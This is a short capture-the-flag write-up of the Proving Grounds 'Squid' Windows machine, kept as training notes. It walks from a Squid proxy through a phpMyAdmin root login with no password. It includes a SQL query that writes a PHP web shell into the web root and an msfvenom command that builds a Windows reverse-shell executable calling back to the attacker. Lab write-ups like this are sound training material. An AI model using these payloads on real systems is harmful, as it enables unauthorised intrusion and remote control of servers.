---
title: "PG Practice: Squid"
created: "2023-08-20"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Practice
machine: "Squid"
os: Windows
status: rooted
tags:
  - - proving-grounds
  - pg-practice
  - windows
  - ctf
  - oscp
  - reverse-shell
  - msfvenom-payload
related:
  - "[[Reverse-Shell-Reference]]"
  - "[[Windows-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Practice: Squid

> **Platform:** Proving Grounds Practice | **OS:** Windows | **Date:** 2023-08-20

---

## Quick Summary

**Open Ports:**
- 3128/tcp (http-proxy)

**Key Techniques:**
- Reverse Shell
- msfvenom Payload

**Privilege Escalation Path:**
- (See walkthrough)

---

## Full Walkthrough

Proving grounds Practice - Squid CTF writeup.

## Nmap

```sh
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
```

Squid http proxy service running on PORT 3128. Use [Squid Pivoting Open Port Scanner](https://github.com/aancw/spose) to perform PORT scanning.


Configure the proxy `server IP` and `PORT` in the browser to access the webserver running on PORT 8080.


**System Information**


**PHPMyadmin**


Login with username `root` and password as `null`.

Execute below sql query to create reverse shell.

```sql
SELECT "<?php system($_GET['cmd'])?>" INTO OUTFILE "C:/wamp/www/shell2.php"
```

As shown in the phpinfo() page the document root folder is `C:/wamp/www`. So the shell will be publicly accessible at `http://192.168.237.189:8080/shell2.php`.

## Remote Code Execution

```text
http://192.168.237.189:8080/shell2.php?cmd=whoami
```


## Obtain Stable Shell using msfvenom

```sh
msfvenom -f exe -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=1234 -o mshell.exe
```

Use curl to download the shell in to the attacking machine. Run a `nc` llisterner and execute the reverse shell by visiting `http://192.168.237.189:8080/shell2.php?cmd=mshell.exe`


Reverse shell obtained.

---

## Technique Links

- [[Reverse-Shell-Reference]]
- [[Windows-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
